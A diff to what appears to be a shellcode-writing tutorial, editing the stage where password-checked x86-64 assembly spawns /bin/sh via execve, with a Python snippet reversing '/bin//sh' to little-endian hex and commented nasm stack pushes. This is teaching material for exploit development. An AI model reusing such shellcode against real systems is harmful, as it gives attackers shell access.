@@ -289,7 +289,7 @@ pass: db "8bytesss" ;define a password
 
 <h3>Stage 7 - Spawn the shell, if password is correct</h3>
 
-So, if we entered the correct password then the code would have jumped over the jne (jump if not equal) instruction and continued on to our execve code where we will actually launch our /bin/sh shell. We will once again be using the stack for this one and to do this we need to clearly understand how execve accepts the arguments.
+So, if we entered the correct password then the code would have jumped over the jne (jump if not equal) instruction and continued on to our execve code where we will actually launch our /bin/sh shell. We will once again be using the stack for this one and to do this we need to clearly understand how execve accepts the arguments. We will not be passing any commandline arguments or environmental variable arguments, so it should look something like this:
 
 <table style="width:100%">
   <tr>
@@ -309,18 +309,28 @@ So, if we entered the correct password then the code would have jumped over the 
   </tr>
   <tr>
     <td>/bin/sh, 0x0</td>
-    <td>0x0000000000000000</td>
     <td>Address of /bin/sh, 0x0000000000000000</td>
+    <td>0x0000000000000000</td>
   </tr>
 </table>
+
+We are using the stack so we will have to construct this command in reverse order. Another important attribute of the 64-bit architecture is that it is little-endian which basically means it will retrieve objects in reverse order. This effectively means that if we want to pass /bin//sh (we add a / to make it a nice 8 bytes, this has no affect on how the OS interprets it), then we need to pass it as hs//nib/ and in hex format. We can easily use python for this once again though.
+
+```python
+shell = '/bin//sh'
+shell[::-1]
+'hs//nib/'
+shell[::-1].encode('hex')
+'68732f2f6e69622f'
+```
 
 ```c
 execve(arguments[0], &arguments[0], NULL);
 ```
 
 ```nasm
-        xor rax, rax
-        push rax
+        xor rax, rax ;zero out rax
+        push rax ;push 8 zero bytes onto the stack for third argument 
 
         mov rbx, 0x68732f2f6e69622f
         push rbx
